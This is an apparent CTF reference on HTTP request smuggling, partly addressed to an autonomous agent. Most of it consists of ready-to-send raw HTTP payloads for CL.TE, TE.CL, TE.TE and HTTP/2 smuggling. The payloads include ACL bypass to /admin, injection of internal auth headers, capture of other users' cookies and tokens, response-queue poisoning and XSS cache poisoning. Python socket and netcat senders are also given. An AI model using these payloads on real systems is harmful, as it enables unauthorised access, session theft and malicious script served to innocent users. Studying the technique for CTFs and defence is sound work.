# HTTP Request Smuggling - CTF Reference

> **Document Purpose:** Actionable HTTP request smuggling techniques for CTF challenges. Covers CL.TE, TE.CL, TE.TE, H2C upgrade smuggling, detection methods, and exploitation strategies for bypassing front-end security controls, accessing admin endpoints, and poisoning response queues for autonomous agent retrieval.

---

## 1. Request Smuggling Fundamentals

> **When to use this section:** You suspect a multi-tier web architecture (reverse proxy + backend) and want to desynchronize how they parse HTTP requests.

**Tags:** `http-smuggling, request-smuggling, fundamentals, clte, tecl`

**Concept:** Request smuggling exploits disagreements between front-end and back-end servers about where one HTTP request ends and the next begins. This is caused by ambiguity in the `Content-Length` and `Transfer-Encoding` headers.

**Prerequisites for Smuggling:**
- Two or more HTTP servers in the request pipeline (e.g., load balancer + app server)
- The servers disagree on which header takes precedence
- HTTP/1.1 keep-alive connections (connection reuse)

**Core Mechanism:**
```
Front-End Server                    Back-End Server
  |                                    |
  |--- Interprets Request A ---------> |--- Interprets Request A (partial) -->
  |                                    |--- Interprets Request B (smuggled) ->
  |--- Interprets Request B ---------> |--- Interprets Request C (from B) --->
```

**Key Headers:**
```http
Content-Length: <number>          # Body size in bytes
Transfer-Encoding: chunked       # Body sent in chunks, terminated by 0\r\n\r\n
```

**HTTP/1.1 Spec Rule:** If both headers are present, `Transfer-Encoding` should take precedence. Many servers violate this rule.

---

## 2. CL.TE Smuggling

> **When to use this section:** The front-end uses Content-Length to determine request boundaries and the back-end uses Transfer-Encoding.

### 2.1 Basic CL.TE Attack

**Tags:** `http-smuggling, clte, content-length, transfer-encoding, smuggling`

**How It Works:**
1. Front-end reads `Content-Length`, forwards the entire body
2. Back-end reads `Transfer-Encoding: chunked`, processes only up to the `0\r\n` chunk terminator
3. Remaining bytes are treated as the start of the next request

**Basic CL.TE Payload:**
```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Explanation:**
- Front-end sees `Content-Length: 13` and forwards all 13 bytes (`0\r\n\r\nSMUGGLED`)
- Back-end sees `Transfer-Encoding: chunked`, reads chunk size `0`, treats request as complete
- `SMUGGLED` remains in the socket buffer as the beginning of the next request

### 2.2 CL.TE to Access /admin

**Tags:** `http-smuggling, clte, admin-bypass, acl-bypass, privilege-escalation`

```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 53
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-site.com
Foo: x
```

**Explanation:**
- Front-end forwards the full body (53 bytes) to the back-end
- Back-end processes the chunked body (empty chunk `0`), then treats the rest as a new request
- The smuggled `GET /admin` bypasses front-end ACL checks because the front-end only sees `POST /`

### 2.3 CL.TE Header Injection

**Tags:** `http-smuggling, clte, header-injection, internal-header`

```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-site.com
X-Internal-Auth: true
X-Forwarded-For: 127.0.0.1
Foo: x
```

**Use Case:** Inject internal-only headers (like `X-Internal-Auth`) that the front-end normally strips or adds itself.

---

## 3. TE.CL Smuggling

> **When to use this section:** The front-end uses Transfer-Encoding and the back-end uses Content-Length.

### 3.1 Basic TE.CL Attack

**Tags:** `http-smuggling, tecl, transfer-encoding, content-length, smuggling`

**How It Works:**
1. Front-end reads `Transfer-Encoding: chunked`, processes all chunks until `0\r\n\r\n`
2. Back-end reads `Content-Length`, processes only that many bytes
3. Remaining bytes are treated as the start of the next request

**Basic TE.CL Payload:**
```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Host: vulnerable-site.com
Content-Type: text/plain
Content-Length: 15

x=1
0

```

**Explanation:**
- Front-end sees `Transfer-Encoding: chunked`, processes chunk of `0x5c` (92) bytes plus the terminating `0` chunk
- Back-end sees `Content-Length: 4`, reads only `5c\r\n` (4 bytes), treats the rest as a new request
- The smuggled `GET /admin` is processed as a separate request by the back-end

### 3.2 TE.CL with Request Hijacking

**Tags:** `http-smuggling, tecl, request-hijacking, credential-theft`

```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 4
Transfer-Encoding: chunked

87
GET /capture HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

data=
0

```

**Use Case:** The smuggled request has a large `Content-Length` that causes the back-end to read the next legitimate user's request as the body of the smuggled request, capturing their headers and cookies.

---

## 4. TE.TE Smuggling (Obfuscated Transfer-Encoding)

> **When to use this section:** Both servers support Transfer-Encoding but you can trick one into not processing it by obfuscating the header.

**Tags:** `http-smuggling, tete, obfuscation, transfer-encoding, header-obfuscation`

**Concept:** Send a `Transfer-Encoding` header that one server processes and the other ignores. The server that ignores it falls back to `Content-Length`.

**Obfuscation Techniques:**
```http
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked

Transfer-Encoding: chunKed

Transfer-Encoding: chunk
ed
```

**TE.TE Example Payload:**
```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: x

5c
GET /admin HTTP/1.1
Host: vulnerable-site.com
Content-Type: text/plain
Content-Length: 15

x=1
0

```

**Explanation:**
- One server uses the valid `Transfer-Encoding: chunked` header
- The other server sees the duplicate/malformed header, ignores both, and falls back to `Content-Length: 4`
- This effectively creates a CL.TE or TE.CL situation depending on which server ignores the obfuscated header

**Testing Approach:** Systematically try each obfuscation variant to find which one causes a disagreement between the front-end and back-end.

---

## 5. Detection Techniques

> **When to use this section:** You want to confirm that request smuggling is possible before crafting exploitation payloads.

### 5.1 Timing-Based Detection

**Tags:** `http-smuggling, detection, timing, differential-response`

**CL.TE Detection (Timing):**
```http
POST / HTTP/1.1
Host: vulnerable-site.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

- If back-end uses chunked: it waits for the terminating `0\r\n\r\n` chunk, causing a timeout
- If back-end uses Content-Length: it processes `1\r\nA` (4 bytes) immediately and responds
- A noticeable delay (~5-10s timeout) indicates the back-end is using Transfer-Encoding (CL.TE variant)

**TE.CL Detection (Timing):**
```http
POST / HTTP/1.1
Host: vulnerable-site.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

- If back-end uses chunked: it processes `0\r\n\r\n` immediately (end of chunked body)
- If back-end uses Content-Length: it waits for 6 bytes, causing a delay
- A noticeable delay indicates the back-end is using Content-Length (TE.CL variant)

### 5.2 Differential Response Detection

**Tags:** `http-smuggling, detection, differential-response, confirmation`

**CL.TE Confirmation:**
```http
POST /search HTTP/1.1
Host: vulnerable-site.com
Content-Length: 49
Transfer-Encoding: chunked

e
q=smugglingtest
0

GET /404check HTTP/1.1
X: x
```

- Send this request followed immediately by a normal `GET /` request
- If vulnerable: the second response will be a 404 (for `/404check`) instead of the homepage
- If not vulnerable: normal 200 response for both

### 5.3 Response Queue Poisoning Detection

**Tags:** `http-smuggling, detection, response-queue, poisoning`

```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 47
Transfer-Encoding: chunked

0

GET /unique-canary-path HTTP/1.1
Host: vulnerable-site.com

```

- Send this, then immediately send a normal request
- If the normal request receives a 404 for `/unique-canary-path`, smuggling is confirmed
- The response queue is desynchronized: responses are shifted by one position

---

## 6. H2C Upgrade Smuggling

> **When to use this section:** The target supports HTTP/2 cleartext (h2c) upgrades and you can bypass front-end restrictions.

**Tags:** `http-smuggling, h2c, http2, upgrade, cleartext`

**Concept:** HTTP/2 cleartext (h2c) upgrade allows upgrading an HTTP/1.1 connection to HTTP/2 without TLS. If the reverse proxy forwards the `Upgrade: h2c` header to the back-end, the connection is upgraded and bypasses the proxy entirely.

**H2C Upgrade Request:**
```http
GET / HTTP/1.1
Host: vulnerable-site.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings

```

**Exploitation Flow:**
1. Send upgrade request through the proxy
2. If the proxy forwards the upgrade headers to the back-end
3. The back-end upgrades the connection to HTTP/2
4. Subsequent HTTP/2 frames go directly to the back-end, bypassing the proxy
5. Access internal endpoints (`/admin`, `/internal-api`) directly

**Testing with curl:**
```bash
# Check if h2c upgrade is supported
curl -v --http2 http://target.com/

# Attempt h2c upgrade with admin path
curl --http2-prior-knowledge http://target.com/admin
```

**Common Indicators:**
- `HTTP/2 101 Switching Protocols` response
- Server supports `Upgrade: h2c` header
- Load balancer/proxy does not strip the Upgrade header

---

## 7. HTTP/2 Downgrade Smuggling

> **When to use this section:** The front-end speaks HTTP/2 and translates to HTTP/1.1 for the back-end, introducing smuggling opportunities.

**Tags:** `http-smuggling, http2, downgrade, h2-to-h1, header-injection`

**Concept:** When a front-end accepts HTTP/2 and rewrites to HTTP/1.1 for the back-end, HTTP/2 pseudo-headers and special characters in header values can inject additional HTTP/1.1 request content.

### 7.1 CRLF Injection via HTTP/2 Headers

**Tags:** `http-smuggling, http2, crlf, header-injection`

```
# HTTP/2 request with CRLF in header value
:method: GET
:path: /
:authority: vulnerable-site.com
foo: bar\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: vulnerable-site.com
```

**Explanation:**
- HTTP/2 binary framing allows `\r\n` in header values (no parsing ambiguity in HTTP/2)
- When the front-end translates this to HTTP/1.1, the `\r\n` creates new headers/request lines
- The back-end interprets the injected content as a separate HTTP/1.1 request

### 7.2 Request Line Injection via :path

**Tags:** `http-smuggling, http2, path-injection, request-line`

```
# HTTP/2 with smuggled request in :path pseudo-header
:method: GET
:path: / HTTP/1.1\r\nHost: vulnerable-site.com\r\n\r\nGET /admin HTTP/1.1\r\nHost: vulnerable-site.com\r\nFoo: bar
:authority: vulnerable-site.com
```

**Explanation:**
- The front-end constructs the HTTP/1.1 request line from `GET` + `:path`
- Injecting a full HTTP/1.1 request inside `:path` creates a smuggled request after translation

### 7.3 Content-Length Desync via HTTP/2

```
# HTTP/2 request with body that is rewritten ambiguously
:method: POST
:path: /
content-length: 0

GET /admin HTTP/1.1
Host: vulnerable-site.com
```

- HTTP/2 front-end processes the body based on DATA frames
- The HTTP/1.1 back-end sees `Content-Length: 0`, treats the body as a new request

---

## 8. Exploitation Techniques

> **When to use this section:** You have confirmed smuggling and want to achieve a specific exploit.

### 8.1 Bypassing Front-End ACLs

**Tags:** `http-smuggling, exploitation, acl-bypass, admin-access`

**Scenario:** `/admin` is blocked by the front-end but accessible on the back-end.

```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Foo: bar
```

**How it works:** The front-end sees `POST /` which is allowed. The back-end processes the smuggled `GET /admin` as a separate request that was never checked by the front-end.

### 8.2 Capturing Other Users' Requests

**Tags:** `http-smuggling, exploitation, request-capture, credential-theft`

```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /comment HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

comment=
```

**How it works:**
- The smuggled request has `Content-Length: 500` but no complete body
- The back-end reads the next user's request as part of the body
- The victim's headers (including cookies, auth tokens) are stored in the `comment` parameter

### 8.3 Response Queue Poisoning

**Tags:** `http-smuggling, exploitation, response-queue, poisoning, xss`

```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 61
Transfer-Encoding: chunked

0

GET /admin-only-page HTTP/1.1
Host: vulnerable-site.com

```

**Effect:**
1. Your request generates two back-end responses (one for `POST /`, one for the smuggled `GET /admin-only-page`)
2. The front-end sends the first response to you and queues the second
3. The next user who makes any request receives the admin page response instead of their expected response
4. This can be used to serve XSS payloads, redirect to attacker-controlled pages, or leak sensitive content

### 8.4 Cache Poisoning via Smuggling

**Tags:** `http-smuggling, exploitation, cache-poisoning, stored-xss`

```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 93
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: vulnerable-site.com
Content-Length: 50

alert('xss')//
```

**Effect:** The cache stores the attacker's content as the response for `/static/main.js`. All subsequent users loading that cached JS file execute the attacker's code.

---

## 9. Common CTF Patterns

> **When to use this section:** Solving HTTP request smuggling challenges in CTF competitions.

**Tags:** `http-smuggling, ctf, patterns, walkthrough`

**Pattern 1: Hidden Admin Panel**
```
Challenge: "Access the admin panel"
Architecture: nginx reverse proxy -> gunicorn/flask
Detection: Send CL.TE timing probe, observe 5s delay
Exploit: Smuggle GET /admin past nginx ACL
Flag location: Usually in /admin response body
```

**Pattern 2: Flag in Internal Header**
```
Challenge: "Find the secret"
Hint: Internal service adds X-Flag header
Exploit: Smuggle request that captures response headers
  POST / with smuggled GET /flag that gets internal header added by back-end
```

**Pattern 3: User Impersonation**
```
Challenge: "Read admin's messages"
Architecture: CDN/proxy -> app server
Exploit: Smuggle a request that captures admin's next request
  The captured cookies let you impersonate the admin
```

**Pattern 4: Cache Deception via Smuggling**
```
Challenge: "Get the admin's profile"
Architecture: Caching proxy -> app server
Exploit: Smuggle request for /admin/profile, poison cache
  Next request to the cached path returns admin profile data
```

**CTF Playbook:**
1. Identify multi-tier architecture (check `Server`, `Via`, `X-Forwarded-*` headers)
2. Try CL.TE timing probe first (most common in CTFs)
3. If no delay, try TE.CL timing probe
4. If neither works, try TE.TE obfuscation variants
5. Once confirmed, smuggle `GET /admin` or `GET /flag` as the first exploit attempt
6. If /admin requires auth, try header injection (`X-Internal-Auth: true`, `X-Forwarded-For: 127.0.0.1`)
7. For response capture, use a stored-data endpoint (comments, profiles) with large Content-Length
8. Always send requests in rapid succession to exploit keep-alive connection reuse

---

## 10. Tool Reference

> **When to use this section:** Quick reference for crafting smuggling payloads with proper byte counts.

**Tags:** `http-smuggling, tools, byte-counting, methodology`

**Counting Bytes for Content-Length:**
```python
# Each line ends with \r\n (2 bytes), blank line is \r\n (2 bytes)
# Example: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n"
body = "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n"
print(len(body))  # Use this as Content-Length
```

**Counting Hex Chunk Size for Transfer-Encoding:**
```python
# Chunk format: <hex-size>\r\n<data>\r\n
smuggled = "GET /admin HTTP/1.1\r\nHost: example.com\r\nContent-Length: 10\r\n\r\nx=1"
print(hex(len(smuggled)))  # Use this as chunk size (without 0x prefix)
```

**Sending Raw Requests with Python:**
```python
import socket

payload = (
    "POST / HTTP/1.1\r\n"
    "Host: vulnerable-site.com\r\n"
    "Content-Length: 13\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "SMUGGLED"
)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("vulnerable-site.com", 80))
sock.send(payload.encode())
response = sock.recv(4096)
print(response.decode())
```

**Sending with netcat:**
```bash
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED' | nc target.com 80
```

---

## 11. Agent Takeaway

> - Use `http_smuggling_probe` tool to detect CL.TE and TE.CL variants via timing differentials
> - Use `http_fetch` with `raw_body` parameter to send manually crafted smuggling payloads
> - CL.TE is the most common variant in CTF challenges (front-end uses Content-Length, back-end uses Transfer-Encoding)
> - Always check for multi-tier architecture first: look for `Via`, `X-Forwarded-*`, differing `Server` headers
> - Start with timing-based detection before attempting exploitation
> - Byte counting is critical: off-by-one errors in `Content-Length` will cause the attack to fail
> - For CTFs, the most common goal is bypassing front-end ACLs to access `/admin` or `/flag`
> - H2C upgrade smuggling is an emerging technique; check if the `Upgrade: h2c` header is forwarded
> - HTTP/2 downgrade smuggling targets front-ends that translate HTTP/2 to HTTP/1.1
> - Response queue poisoning can serve attacker-controlled content to other users
> - Always send smuggling requests in rapid succession to exploit connection reuse before keepalive timeout
